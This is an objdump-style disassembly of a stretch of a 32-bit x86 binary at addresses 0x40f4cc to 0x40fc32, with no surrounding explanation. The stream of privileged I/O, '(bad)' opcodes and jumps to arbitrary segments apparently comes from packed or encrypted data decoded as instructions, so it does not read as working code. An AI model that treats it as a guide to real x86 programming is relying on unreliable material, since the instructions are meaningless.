  40f4cc:	retf   0xcead
  40f4cf:	mul    bh
  40f4d1:	out    0x33,eax
  40f4d3:	mov    dl,0x1
  40f4d5:	pop    es
  40f4d6:	add    DWORD PTR [ecx+0x4010c917],esi
  40f4dc:	mov    al,ds:0x2921bc08
  40f4e1:	scas   eax,DWORD PTR es:[edi]
  40f4e2:	inc    edi
  40f4e3:	dec    ebx
  40f4e4:	inc    edx
  40f4e5:	gs or  eax,0x4e869d51
  40f4eb:	add    al,0x76
  40f4ed:	cmp    edi,DWORD PTR [ecx-0x26]
  40f4f0:	and    edi,DWORD PTR [ecx]
  40f4f2:	sub    esp,DWORD PTR [ecx]
  40f4f4:	push   cs
  40f4f5:	xchg   esi,eax
  40f4f6:	addr16 addr16 dec ebp
  40f4f9:	sub    ebx,DWORD PTR [ecx-0x2e]
  40f4fc:	mul    bh
  40f4fe:	jno    0x40f55c
  40f500:	sub    dl,BYTE PTR [ecx+0x7db1b771]
  40f506:	fwait
  40f507:	shl    DWORD PTR [edx],0xda
  40f50a:	enter  0x4983,0x6
  40f50e:	mov    edx,0x403bcac2
  40f513:	mov    esi,0xed5325e6
  40f518:	or     bh,BYTE PTR [edi-0x72]
  40f51b:	in     al,dx
  40f51c:	xchg   edi,eax
  40f51d:	or     esi,DWORD PTR [ecx+0x75]
  40f520:	cmp    bl,BYTE PTR [esi+0xc09ccdb]
  40f526:	mov    ah,ch
  40f528:	mov    eax,ds:0x149413b
  40f52d:	pushf  
  40f52e:	add    ebp,DWORD PTR [edi-0x4662d6fa]
  40f534:	aam    0x3c
  40f536:	xchg   edx,eax
  40f537:	sahf   
  40f538:	mov    ecx,0x42cfd449
  40f53d:	push   cs
  40f53e:	sub    al,0x2c
  40f540:	xor    eax,DWORD PTR [ebx+0x54]
  40f543:	jmp    0x44ad:0x24d52ff7
  40f54a:	jo     0x40f4dc
  40f54c:	leave  
  40f54d:	test   BYTE PTR [esp+ebp*1-0x1e4f3fd7],0xc4
  40f555:	ins    BYTE PTR es:[edi],dx
  40f556:	mov    es,WORD PTR [edi-0x22]
  40f559:	out    dx,eax
  40f55a:	idiv   DWORD PTR [ecx]
  40f55c:	leave  
  40f55d:	mov    ds:0xcca4f6c8,al
  40f562:	lods   eax,DWORD PTR ds:[esi]
  40f563:	jmp    0x40f5a9
  40f565:	cmp    eax,0x63b23747
  40f56a:	daa    
  40f56b:	xchg   esp,eax
  40f56c:	jns    0x40f57a
  40f56e:	sbb    esp,0x23
  40f571:	scas   al,BYTE PTR es:[edi]
  40f572:	ja     0x40f5df
  40f574:	loope  0x40f55c
  40f576:	and    eax,0x30bd34be
  40f57b:	ins    DWORD PTR es:[edi],dx
  40f57c:	push   ebx
  40f57d:	adc    eax,0xa48541a7
  40f582:	fldenv [ecx-0x45]
  40f585:	sub    cl,BYTE PTR [ebx]
  40f587:	adc    eax,0x9d97df1d
  40f58d:	icebp  
  40f58e:	lahf   
  40f58f:	ins    DWORD PTR es:[edi],dx
  40f590:	imul   ebp,DWORD PTR [bx+si],0x0
  40f594:	fidivr WORD PTR [eax-0x68]
  40f597:	inc    ebx
  40f598:	jb     0x40f5a4
  40f59a:	xchg   edx,eax
  40f59b:	jne    0x40f542
  40f59d:	mov    ch,0xc8
  40f59f:	jp     0x40f5ae
  40f5a1:	retf   
  40f5a2:	jae    0x40f55e
  40f5a4:	popf   
  40f5a5:	lss    esp,FWORD PTR [ecx-0x2ad184a8]
  40f5ac:	push   ds
  40f5ad:	mov    dl,0xf5
  40f5af:	ja     0x40f570
  40f5b1:	daa    
  40f5b2:	xchg   DWORD PTR [edi-0x18],eax
  40f5b5:	and    al,0xee
  40f5b7:	cli    
  40f5b8:	xor    DWORD PTR [edi-0x10],0x48127695
  40f5bf:	or     al,0x8f
  40f5c1:	lea    ebp,[ebx+ebp*8+0x2b9335d8]
  40f5c8:	adc    eax,0xc377a240
  40f5cd:	push   cs
  40f5ce:	cmc    
  40f5cf:	jg     0x40f58d
  40f5d1:	dec    edx
  40f5d2:	sbb    dh,bh
  40f5d4:	mov    edi,0x45431102
  40f5d9:	in     al,0x13
  40f5db:	shr    cl,1
  40f5dd:	jg     0x40f631
  40f5df:	arpl   WORD PTR [ebp-0x36106a98],bp
  40f5e5:	(bad)  
  40f5e6:	xchg   esi,esi
  40f5e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f5e9:	sti    
  40f5ea:	jp     0x40f5fd
  40f5ec:	in     eax,dx
  40f5ed:	aas    
  40f5ee:	dec    ebp
  40f5ef:	in     eax,dx
  40f5f0:	jmp    0x40f5a3
  40f5f2:	les    esp,FWORD PTR [ebx+0x4f]
  40f5f5:	mov    eax,0x962309c1
  40f5fa:	lds    edx,FWORD PTR [ecx+esi*8+0x5d]
  40f5fe:	mov    ch,0xba
  40f600:	mov    esp,0x2a197f3c
  40f605:	mov    ch,0x4d
  40f607:	icebp  
  40f608:	cmp    al,0xaf
  40f60b:	in     al,dx
  40f60c:	push   es
  40f60d:	or     edi,DWORD PTR [edx+0x5d]
  40f610:	cdq    
  40f611:	out    dx,eax
  40f612:	scas   al,BYTE PTR es:[edi]
  40f613:	push   cs
  40f614:	arpl   WORD PTR [ecx-0x6accacb4],si
  40f61a:	inc    edx
  40f61b:	bound  edi,QWORD PTR [edx-0x36]
  40f61e:	nop
  40f61f:	or     ebp,edi
  40f621:	mov    ah,0x8e
  40f623:	xor    eax,0x9622734c
  40f628:	push   ds
  40f629:	loopne 0x40f66f
  40f62b:	ins    BYTE PTR es:[edi],dx
  40f62c:	shl    ch,1
  40f62e:	and    bh,ah
  40f630:	mov    esi,0xb43dfc63
  40f635:	push   ebp
  40f636:	in     eax,dx
  40f637:	cmp    eax,0x70ab0713
  40f63c:	xor    cl,BYTE PTR [edx]
  40f63e:	push   esp
  40f63f:	push   ds
  40f640:	test   BYTE PTR [ebx],al
  40f642:	out    0x27,eax
  40f644:	in     eax,0xb8
  40f646:	add    dh,BYTE PTR [ecx-0x2e]
  40f649:	nop
  40f64a:	scas   eax,DWORD PTR es:[edi]
  40f64b:	arpl   WORD PTR [ebx-0x1600d2d6],di
  40f651:	xor    BYTE PTR [ecx],0x7d
  40f654:	xor    BYTE PTR [esi-0x72d464bf],dh
  40f65a:	out    dx,eax
  40f65b:	test   DWORD PTR [ebx+0x589bb601],edi
  40f661:	or     eax,0xde75c002
  40f666:	into   
  40f667:	popf   
  40f668:	sub    al,BYTE PTR [ebx+0x7b]
  40f66b:	shr    BYTE PTR [ebp-0x22ad3a83],1
  40f671:	sub    eax,0xd692555f
  40f676:	outs   dx,BYTE PTR ds:[esi]
  40f677:	push   cs
  40f678:	and    esi,ecx
  40f67a:	icebp  
  40f67b:	ucomiss xmm1,DWORD PTR [edx+esi*2+0x3a]
  40f680:	xchg   ecx,eax
  40f681:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f682:	ins    DWORD PTR es:[edi],dx
  40f683:	mov    cl,0xd7
  40f685:	fimul  WORD PTR [ebx]
  40f687:	sbb    ecx,DWORD PTR [esi+esi*4+0x5fb33393]
  40f68e:	aad    0xc7
  40f690:	mov    ds:0xd0d898f8,al
  40f695:	inc    edi
  40f696:	and    eax,0x657eb983
  40f69b:	jmp    0x40f682
  40f69d:	int    0x59
  40f69f:	lods   eax,DWORD PTR ds:[esi]
  40f6a0:	lds    ebp,FWORD PTR [ecx+ecx*4]
  40f6a3:	popa   
  40f6a4:	inc    ecx
  40f6a5:	add    eax,0xd738ad00
  40f6aa:	in     eax,0xdd
  40f6ac:	(bad)  
  40f6ad:	jl     0x40f636
  40f6af:	cmp    BYTE PTR [ebp*8+0x100c38e4],al
  40f6b6:	mov    ecx,0xadb41c0e
  40f6bb:	cld    
  40f6bc:	jo     0x40f65d
  40f6be:	lods   al,BYTE PTR ds:[esi]
  40f6bf:	fbstp  TBYTE PTR [edx+eax*2-0x785848f2]
  40f6c6:	xchg   ebx,eax
  40f6c7:	dec    DWORD PTR [edi-0x66]
  40f6ca:	inc    edx
  40f6cb:	mov    ebx,0x60187d83
  40f6d0:	aam    0xdd
  40f6d2:	jp     0x40f6b7
  40f6d4:	popa   
  40f6d5:	mov    al,0xca
  40f6d7:	outs   dx,DWORD PTR ds:[esi]
  40f6d8:	(bad)  
  40f6da:	cmp    ch,BYTE PTR [ecx]
  40f6dc:	mov    ah,0x57
  40f6de:	xchg   ebx,eax
  40f6df:	fnsave [ebx-0x18]
  40f6e2:	add    edi,DWORD PTR [edx-0x70f198db]
  40f6e8:	mov    ds:0xc69e6bfa,al
  40f6ed:	ins    BYTE PTR es:[edi],dx
  40f6ee:	scas   eax,DWORD PTR es:[edi]
  40f6ef:	pop    ebx
  40f6f0:	in     al,dx
  40f6f1:	mov    ah,0x42
  40f6f3:	dec    edi
  40f6f4:	int    0x96
  40f6f6:	or     dh,bh
  40f6f8:	adc    eax,0x533e2e62
  40f6fd:	jns    0x40f6ab
  40f6ff:	adc    DWORD PTR [eax-0x3a3d66ac],ebp
  40f705:	test   eax,0x8243f3dc
  40f70a:	popf   
  40f70b:	lds    edx,FWORD PTR [ecx+0x6e]
  40f70e:	mov    dh,0x3e
  40f710:	xchg   ebp,eax
  40f711:	cmp    al,0x6f
  40f713:	add    al,0x3c
  40f715:	sar    dh,0x87
  40f718:	xor    ah,BYTE PTR [eax-0xd4b104a]
  40f71e:	ror    ch,1
  40f720:	push   es
  40f721:	pop    eax
  40f722:	loop   0x40f710
  40f724:	rcl    DWORD PTR [esi],0x9f
  40f727:	out    dx,al
  40f728:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f729:	fisub  WORD PTR [esi]
  40f72b:	in     al,0x63
  40f72d:	ss jle 0x40f779
  40f730:	imul   ecx,DWORD PTR [esp+esi*1-0x54e04edc],0xffffff81
  40f738:	jp     0x40f784
  40f73a:	push   eax
  40f73b:	mov    ah,0x79
  40f73d:	sbb    DWORD PTR ds:0x81cd8b9e,esi
  40f743:	add    bl,BYTE PTR [ecx-0x64f27ee9]
  40f749:	jmp    DWORD PTR [eax]
  40f74b:	xor    al,0xf4
  40f74d:	inc    eax
  40f74e:	outs   dx,BYTE PTR ds:[esi]
  40f74f:	loope  0x40f78a
  40f751:	sub    eax,0x23706c00
  40f756:	mov    cl,0x16
  40f758:	push   es
  40f759:	jmpw   0x96e1
  40f75d:	mov    bh,0x72
  40f75f:	sar    DWORD PTR [ebp-0x7309150c],0xc2
  40f766:	cmp    BYTE PTR [ebp-0x345cd28d],cl
  40f76c:	sbb    DWORD PTR [edi-0x460d50ee],ecx
  40f772:	dec    ecx
  40f773:	sub    ebx,DWORD PTR [eax+0x8]
  40f776:	popf   
  40f777:	fst    DWORD PTR [esi-0x7e]
  40f77a:	out    dx,eax
  40f77b:	sbb    eax,0x86b1583e
  40f780:	dec    BYTE PTR [ecx]
  40f782:	ja     0x40f77d
  40f784:	stos   DWORD PTR es:[edi],eax
  40f785:	ja     0x40f740
  40f787:	bound  edi,QWORD PTR [ecx+ebx*4-0x2c4c37c5]
  40f78e:	arpl   cx,sp
  40f790:	pusha  
  40f791:	stc    
  40f792:	xchg   edx,eax
  40f793:	outs   dx,BYTE PTR ds:[esi]
  40f794:	xchg   BYTE PTR [edx+0x4c],ch
  40f797:	adc    esp,0x9e5034df
  40f79d:	ror    BYTE PTR [ecx],cl
  40f79f:	retf   0x4bc1
  40f7a2:	or     eax,0xde6e190e
  40f7a7:	sahf   
  40f7a8:	sbb    dh,BYTE PTR [ebx*2-0x78770bb6]
  40f7af:	ficom  WORD PTR [ecx]
  40f7b1:	addr16 inc ebp
  40f7b3:	nop
  40f7b4:	lods   al,BYTE PTR ds:[esi]
  40f7b5:	sub    al,0xee
  40f7b7:	dec    ebx
  40f7b8:	pop    ebx
  40f7b9:	adc    edi,DWORD PTR [edi+esi*4+0x4b]
  40f7bd:	repz loop 0x40f7c8
  40f7c0:	fbstp  TBYTE PTR [edi]
  40f7c2:	push   0xffffff99
  40f7c4:	sbb    eax,0x7bde70b0
  40f7c9:	push   esp
  40f7ca:	push   0x2a322d47
  40f7cf:	es jae 0x40f7c7
  40f7d2:	xchg   BYTE PTR [edi],al
  40f7d4:	sti    
  40f7d5:	test   DWORD PTR [ecx+0x64],ebx
  40f7d8:	inc    ecx
  40f7d9:	pop    esp
  40f7da:	cli    
  40f7db:	js     0x40f7e6
  40f7dd:	(bad)  
  40f7de:	mov    edx,0x602c2562
  40f7e3:	outs   dx,BYTE PTR ds:[esi]
  40f7e4:	(bad)  
  40f7e5:	fsub   QWORD PTR [ebp+0x1871b073]
  40f7eb:	popa   
  40f7ec:	enter  0xb3a9,0xa8
  40f7f0:	aas    
  40f7f1:	mov    ebx,0x517d3679
  40f7f6:	xor    ebx,DWORD PTR [esi]
  40f7f8:	inc    ebp
  40f7f9:	fcmove st,st(4)
  40f7fb:	fst    QWORD PTR [esi]
  40f7fd:	pop    ds
  40f7fe:	gs sahf 
  40f800:	in     al,dx
  40f801:	jo     0x40f78d
  40f803:	pop    ecx
  40f804:	mov    edi,DWORD PTR [edi]
  40f806:	sbb    DWORD PTR [ecx+0xabd4828],ecx
  40f80c:	pop    ds
  40f80d:	pop    edi
  40f80e:	call   0x9412305
  40f813:	inc    ebx
  40f814:	ror    al,1
  40f816:	push   ebx
  40f817:	mov    esp,0x96272c40
  40f81c:	or     ch,BYTE PTR [esp+eiz*2]
  40f81f:	(bad)  
  40f820:	pop    edx
  40f821:	mov    bl,0xdb
  40f823:	xor    eax,0xee5eaa66
  40f828:	dec    ebx
  40f829:	adc    BYTE PTR [ebp-0x5f812432],bl
  40f82f:	call   0xdb25:0x965c2996
  40f836:	jge    0x40f870
  40f838:	adc    DWORD PTR [ebx+ecx*8-0x17],esp
  40f83c:	inc    esp
  40f83d:	(bad)  
  40f83e:	(bad)  [ebx]
  40f840:	sub    DWORD PTR [ecx+edi*4-0x70],ebx
  40f844:	and    eax,DWORD PTR ds:0x33b41190
  40f84a:	jmp    0x286a9b93
  40f84f:	(bad)  
  40f850:	rcr    dh,cl
  40f852:	aas    
  40f853:	mov    ds:0xd123a866,eax
  40f858:	loopne 0x40f826
  40f85a:	test   DWORD PTR ds:0x64b92896,esi
  40f860:	mov    eax,ds:0xd20b9af5
  40f865:	inc    edi
  40f866:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f867:	std    
  40f868:	jno    0x40f818
  40f86a:	jle    0x40f849
  40f86c:	shl    DWORD PTR [edx+0x46ee16e9],1
  40f872:	rcr    ch,cl
  40f874:	xchg   edi,eax
  40f875:	pop    ebx
  40f876:	jle    0x40f8e3
  40f878:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f879:	adc    edi,DWORD PTR [edx]
  40f87b:	add    DWORD PTR [ebx-0x7d7dfb86],eax
  40f881:	(bad)  
  40f882:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f883:	add    BYTE PTR [esi],dh
  40f885:	cmp    BYTE PTR [esi-0x80],ah
  40f888:	addr16 cld 
  40f88a:	gs das 
  40f88c:	inc    edi
  40f88d:	fcom   st(5)
  40f88f:	std    
  40f890:	dec    ebx
  40f891:	clc    
  40f892:	xchg   ecx,eax
  40f893:	xor    DWORD PTR [esi+0x72],0x1d
  40f897:	xchg   esp,eax
  40f898:	loop   0x40f8e5
  40f89a:	sbb    DWORD PTR [eax],edi
  40f89c:	dec    ebp
  40f89d:	cli    
  40f89e:	mov    eax,ds:0xdb5147f9
  40f8a3:	inc    esp
  40f8a4:	cmp    al,0x62
  40f8a6:	mov    esp,0xb99ba75e
  40f8ab:	pop    edi
  40f8ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8ae:	fld    st(6)
  40f8b0:	ret    0x9e76
  40f8b3:	push   esi
  40f8b4:	or     bh,bl
  40f8b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8b7:	sbb    bl,bh
  40f8b9:	sub    al,0x52
  40f8bb:	inc    eax
  40f8bc:	cmc    
  40f8bd:	mov    ebx,fs
  40f8bf:	ins    DWORD PTR es:[edi],dx
  40f8c0:	add    ah,BYTE PTR [edx-0x1a]
  40f8c3:	inc    edx
  40f8c4:	sub    eax,0xe668cb1b
  40f8c9:	loope  0x40f8b5
  40f8cb:	sub    dh,BYTE PTR [eax-0x48390de5]
  40f8d1:	mov    BYTE PTR ds:0x132c2c5a,al
  40f8d7:	mov    edx,0xcdea119a
  40f8dc:	stc    
  40f8dd:	inc    ecx
  40f8de:	xchg   ecx,eax
  40f8df:	and    esp,DWORD PTR [edi]
  40f8e1:	adc    cl,BYTE PTR [ebx+esi*2-0x74]
  40f8e5:	inc    esp
  40f8e6:	add    al,0xf
  40f8e8:	xchg   ecx,eax
  40f8e9:	adc    ch,BYTE PTR [ebp+eax*2+0xc]
  40f8ed:	shl    DWORD PTR [ecx+ebp*4-0x72],0xd1
  40f8f2:	mov    edi,0xa2a8cd2b
  40f8f7:	inc    edx
  40f8f8:	mov    ah,0xd2
  40f8fa:	push   eax
  40f8fb:	iret   
  40f8fc:	pop    edi
  40f8fd:	add    dl,BYTE PTR [esi+ecx*8]
  40f900:	add    eax,0x356dac2c
  40f905:	cmp    edx,DWORD PTR [ecx+0x1d6097ff]
  40f90b:	mov    ah,0x46
  40f90d:	mov    ds:0x86f2f58a,al
  40f912:	jno    0x40f920
  40f914:	adc    BYTE PTR [ebp-0x1a47f129],ah
  40f91a:	mov    esi,0x6cddcaf4
  40f91f:	stos   BYTE PTR es:[edi],al
  40f920:	loop   0x40f956
  40f922:	mov    dh,0xef
  40f924:	leave  
  40f925:	icebp  
  40f926:	adc    DWORD PTR [ebx+0x783d745f],edx
  40f92c:	imul   eax,DWORD PTR [esi-0x676c71d6],0x12
  40f933:	or     al,0xc0
  40f935:	das    
  40f936:	and    dl,0xa1
  40f939:	or     dh,0x48
  40f93c:	addr16 in eax,0xa3
  40f93f:	jl     0x40f907
  40f941:	ret    0x8e8f
  40f944:	pushf  
  40f945:	gs or  al,0xc6
  40f948:	sbb    al,BYTE PTR ds:0x6ff2d4ca
  40f94e:	(bad)
  40f952:	fidiv  DWORD PTR [ebx+eax*4+0x45]
  40f956:	adc    BYTE PTR [ebp-0x697e7644],ch
  40f95c:	pop    ss
  40f95d:	cmp    BYTE PTR [esi+0x67],dh
  40f960:	push   0xd425eef0
  40f965:	xchg   edx,eax
  40f966:	sar    ebx,0xfc
  40f969:	inc    edx
  40f96a:	aas    
  40f96b:	sub    DWORD PTR [esi],esp
  40f96d:	cwde   
  40f96e:	mov    ah,0x66
  40f970:	out    0xcf,al
  40f972:	mov    al,BYTE PTR [eax+0x36]
  40f975:	cmp    al,cl
  40f977:	lea    esp,[ebp+0x68]
  40f97a:	mov    cl,0x98
  40f97c:	and    esp,eax
  40f97e:	fs mov ecx,0x9cb0b842
  40f984:	push   esi
  40f985:	sub    cl,cl
  40f987:	lods   eax,DWORD PTR ds:[esi]
  40f988:	sti    
  40f989:	mov    dh,0x4c
  40f98b:	add    eax,0x3b75ad
  40f990:	add    dl,bl
  40f992:	push   ebx
  40f993:	stos   DWORD PTR es:[edi],eax
  40f994:	loopne 0x40f93d
  40f996:	shr    BYTE PTR ds:0xe6872f6e,1
  40f99c:	mov    ecx,0x7d856918
  40f9a1:	mov    esi,0x838603f0
  40f9a6:	adc    dh,BYTE PTR [esi+0x32]
  40f9a9:	repz jmp 0x2d38:0x6a4124e3
  40f9b1:	inc    eax
  40f9b2:	xchg   edi,eax
  40f9b3:	inc    esp
  40f9b4:	out    0x51,eax
  40f9b6:	fnstsw WORD PTR [edi-0xc]
  40f9b9:	cmp    al,0xa9
  40f9bb:	xchg   ebx,eax
  40f9bc:	mov    eax,ds:0x75799b9b
  40f9c1:	jbe    0x40f948
  40f9c3:	mov    al,0x31
  40f9c5:	pusha  
  40f9c6:	lods   eax,DWORD PTR ds:[esi]
  40f9c7:	inc    edx
  40f9c8:	call   0x6571:0xc831b773
  40f9cf:	adc    eax,0xa502d26d
  40f9d4:	rcl    BYTE PTR [ebx+0x7234ab3c],cl
  40f9da:	mov    ecx,DWORD PTR [eax*8-0x2f76409e]
  40f9e1:	cmp    esp,DWORD PTR ds:0xe08943fb
  40f9e7:	loop   0x40fa07
  40f9e9:	mov    ds:0xccbc33fa,al
  40f9ee:	out    dx,eax
  40f9ef:	shr    bl,cl
  40f9f1:	pop    ebp
  40f9f2:	mov    ebx,0x89154ce8
  40f9f7:	outs   dx,DWORD PTR ds:[esi]
  40f9f8:	cli    
  40f9f9:	jle    0x40f9be
  40f9fb:	sub    ecx,DWORD PTR [ebx+0x30]
  40f9fe:	fnstcw WORD PTR [ebx+0x5c]
  40fa01:	pop    ds
  40fa02:	mov    edi,0x6649c4ce
  40fa07:	mov    ds:0xf401615,eax
  40fa0c:	sbb    DWORD PTR [edi],esp
  40fa0e:	pusha  
  40fa0f:	shr    esp,1
  40fa11:	sbb    al,0xd7
  40fa13:	jb     0x40f9d7
  40fa15:	dec    ebx
  40fa16:	loope  0x40f9fc
  40fa18:	(bad)  
  40fa19:	lds    ecx,FWORD PTR [edx-0x70]
  40fa1c:	sub    BYTE PTR [edx+0x4637ec67],dh
  40fa22:	pop    ebx
  40fa23:	dec    esi
  40fa24:	lods   eax,DWORD PTR ds:[esi]
  40fa25:	inc    BYTE PTR [esp+ecx*1+0x2a]
  40fa29:	adc    ah,al
  40fa2b:	mov    cl,0x8e
  40fa2d:	imul   esi,ebp,0xfcd42bd0
  40fa33:	sahf   
  40fa34:	nop
  40fa35:	frstpm(287 only) 
  40fa37:	mov    edx,0xc6a642c6
  40fa3c:	sub    cl,ah
  40fa3e:	mov    ss,WORD PTR [edi-0x699c34f]
  40fa44:	cli    
  40fa45:	adc    al,0xce
  40fa47:	jae    0x40faa7
  40fa49:	push   cs
  40fa4a:	and    al,0xcf
  40fa4c:	les    ebx,FWORD PTR [ebx-0x5034d7e7]
  40fa52:	(bad)  
  40fa53:	push   0x3c3014af
  40fa58:	neg    DWORD PTR [ebp+0x57]
  40fa5b:	xor    DWORD PTR [edx+0x73],edx
  40fa5e:	sub    esi,esi
  40fa60:	adc    al,0x23
  40fa62:	(bad)  
  40fa63:	ss ret 0x45fa
  40fa67:	(bad)  
  40fa68:	div    edi
  40fa6a:	push   ds
  40fa6b:	fnstsw WORD PTR [ebx]
  40fa6d:	pop    DWORD PTR [edi+0xea5398c]
  40fa73:	(bad)  ds:0x98254b50
  40fa79:	(bad)  
  40fa7a:	push   ds
  40fa7b:	mov    bh,0xf3
  40fa7d:	test   BYTE PTR [ebp+0x1df4a4f8],0x46
  40fa84:	(bad)  
  40fa85:	mov    ds:0xa8f8a49,eax
  40fa8a:	lahf   
  40fa8b:	jo     0x40fa42
  40fa8d:	inc    eax
  40fa8e:	and    ebp,DWORD PTR [edx+0x43067e17]
  40fa94:	cmp    al,0x6e
  40fa96:	in     eax,dx
  40fa97:	hlt    
  40fa98:	mov    ebx,0xb9ac96c2
  40fa9d:	cdq    
  40fa9e:	dec    ebp
  40fa9f:	ror    BYTE PTR [ecx-0x76],0x96
  40faa3:	sub    al,0xb4
  40faa5:	adc    bl,BYTE PTR [esi-0x58]
  40faa8:	stc    
  40faa9:	popf   
  40faaa:	outs   dx,DWORD PTR ds:[esi]
  40faab:	mov    ds:0xc92c1a42,eax
  40fab0:	mov    al,0xfe
  40fab2:	stos   DWORD PTR es:[edi],eax
  40fab3:	test   BYTE PTR [esi+esi*1],ah
  40fab6:	les    ebx,FWORD PTR [edi]
  40fab8:	es scas al,BYTE PTR es:[edi]
  40faba:	xchg   ebp,eax
  40fabb:	sub    ah,BYTE PTR [edx+0x4c4c4e8e]
  40fac1:	xchg   BYTE PTR [ecx],bh
  40fac3:	sbb    al,0x35
  40fac5:	lods   al,BYTE PTR ds:[esi]
  40fac6:	mov    al,ds:0xc2886eb3
  40facb:	or     eax,0xff5a592
  40fad0:	adc    ah,BYTE PTR [esi+esi*8+0x3257eb2e]
  40fad7:	out    0x22,al
  40fad9:	mov    DWORD PTR [ebx+0x6f05b664],eax
  40fadf:	pop    ecx
  40fae0:	jmp    0x40fb61
  40fae2:	out    dx,al
  40fae3:	push   es
  40fae4:	ds out 0x33,eax
  40fae7:	add    DWORD PTR [eax+0x2a],0x2b
  40faeb:	adc    eax,0xe961c74
  40faf0:	fst    DWORD PTR [ebx]
  40faf2:	sub    BYTE PTR [edx],0x34
  40faf5:	sub    al,0x2c
  40faf7:	xchg   esi,eax
  40faf8:	xor    cl,BYTE PTR [eax]
  40fafa:	mov    eax,ds:0x68a96bbf
  40faff:	pusha  
  40fb00:	in     eax,0xbb
  40fb02:	in     eax,0xf8
  40fb04:	sub    BYTE PTR [eax],bl
  40fb06:	out    0x2c,eax
  40fb08:	ret    0x83e6
  40fb0b:	push   0x4a44ad20
  40fb10:	jns    0x40fae2
  40fb12:	and    esi,ebp
  40fb14:	ja     0x40fb22
  40fb16:	pop    edi
  40fb17:	in     al,0x42
  40fb19:	add    al,0xa4
  40fb1b:	cdq    
  40fb1c:	outs   dx,BYTE PTR ds:[esi]
  40fb1d:	ficom  WORD PTR [ebx]
  40fb1f:	adc    ecx,edx
  40fb21:	jl     0x40fb74
  40fb23:	pop    esp
  40fb24:	fild   DWORD PTR [ecx]
  40fb26:	pop    ecx
  40fb27:	jp     0x40fabe
  40fb29:	sbb    edi,0xffffffaf
  40fb2c:	push   edx
  40fb2d:	inc    ebp
  40fb2e:	push   ecx
  40fb2f:	push   0xfffffffe
  40fb31:	test   BYTE PTR [eax],bh
  40fb33:	imul   esp,ebx,0xc
  40fb36:	xchg   ebx,eax
  40fb37:	addr16 loop 0x40fabb
  40fb3a:	leave  
  40fb3b:	inc    edx
  40fb3c:	das    
  40fb3d:	dec    ebp
  40fb3e:	mov    eax,0xbca46a6f
  40fb43:	icebp  
  40fb44:	(bad)  
  40fb45:	pop    edi
  40fb46:	or     BYTE PTR [esi+ebp*4+0x2a126826],ah
  40fb4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb4e:	popf   
  40fb4f:	xor    eax,0x12ab903d
  40fb54:	jns    0x40fb1e
  40fb56:	pushf  
  40fb57:	mov    ah,0x26
  40fb59:	or     DWORD PTR [ebx+0x2c42179d],eax
  40fb5f:	cmc    
  40fb60:	imul   ebp,DWORD PTR [eax-0x7a],0xffffffdf
  40fb64:	and    eax,ebx
  40fb66:	neg    DWORD PTR [esi+0x10f1e797]
  40fb6c:	sbb    edi,DWORD PTR [esi+ebx*4+0xc]
  40fb70:	mov    al,BYTE PTR [edx-0x9]
  40fb73:	sti    
  40fb74:	mov    bh,0xa5
  40fb76:	push   ecx
  40fb77:	xchg   ebx,eax
  40fb78:	dec    ecx
  40fb79:	pop    ebp
  40fb7a:	push   es
  40fb7b:	in     al,dx
  40fb7c:	mov    eax,0x79dcca7e
  40fb81:	inc    ebx
  40fb82:	push   cs
  40fb83:	in     al,0xe5
  40fb85:	fild   QWORD PTR [eax+0x2c]
  40fb88:	jecxz  0x40fb55
  40fb8a:	inc    esi
  40fb8b:	mov    ds:0x3dd622eb,al
  40fb90:	mov    al,0xcc
  40fb92:	je     0x40fb4f
  40fb94:	addr16 loopne 0x40fb8f
  40fb97:	data16 jge 0x40fb3b
  40fb9a:	push   0x615b8f53
  40fb9f:	arpl   bx,dx
  40fba1:	pushf  
  40fba2:	or     dl,al
  40fba4:	gs pop esi
  40fba6:	mov    ecx,cs
  40fba8:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40fbaa:	mov    ebp,0xe76773ec
  40fbaf:	mov    ds:0x1200c2af,al
  40fbb4:	sahf   
  40fbb5:	retf   0xa98d
  40fbb8:	mov    dl,0x80
  40fbba:	neg    DWORD PTR [edi-0x37]
  40fbbd:	mov    dh,0x39
  40fbbf:	jb     0x40fb6b
  40fbc1:	push   ebx
  40fbc2:	aad    0x82
  40fbc4:	shl    BYTE PTR [ebx],0x34
  40fbc7:	retf   0x9d9b
  40fbca:	(bad)  
  40fbcc:	add    edx,ebp
  40fbce:	push   0x7e9697
  40fbd3:	jbe    0x40fbd2
  40fbd5:	loopne 0x40fb60
  40fbd7:	into   
  40fbd8:	mov    ecx,0x84265d05
  40fbdd:	sub    eax,0xbf619a8
  40fbe2:	addr16 ja 0x40fc22
  40fbe5:	fisubr WORD PTR [edx-0x49]
  40fbe8:	or     esp,DWORD PTR [ebp-0x9]
  40fbeb:	jne    0x40fbf9
  40fbed:	add    ebx,ecx
  40fbef:	jle    0x40fc14
  40fbf1:	jbe    0x40fc44
  40fbf3:	out    0x3,al
  40fbf5:	in     al,dx
  40fbf6:	sti    
  40fbf7:	jo     0x40fc73
  40fbf9:	fstp   DWORD PTR [eax+0x42]
  40fbfc:	xor    al,0x51
  40fbfe:	repnz pusha 
  40fc00:	lea    esp,[edi]
  40fc02:	jl     0x40fba5
  40fc04:	fsub   st(3),st
  40fc06:	adc    eax,0x367d77cb
  40fc0b:	or     dl,dl
  40fc0d:	adc    BYTE PTR [eax],bh
  40fc0f:	aaa    
  40fc10:	int    0xd8
  40fc12:	cmp    DWORD PTR [ebx-0x6c],0x6ceb9471
  40fc19:	push   0xe108f706
  40fc1e:	dec    edx
  40fc1f:	fwait
  40fc20:	add    bl,BYTE PTR [esi]
  40fc22:	add    dl,BYTE PTR [esi+eiz*2-0x3f]
  40fc26:	xchg   ecx,eax
  40fc27:	scas   al,BYTE PTR es:[edi]
  40fc28:	push   0xae34a42d
  40fc2d:	inc    eax
  40fc2e:	(bad)  
  40fc2f:	loope  0x40fc65
  40fc31:	cdq    
  40fc32:	into   
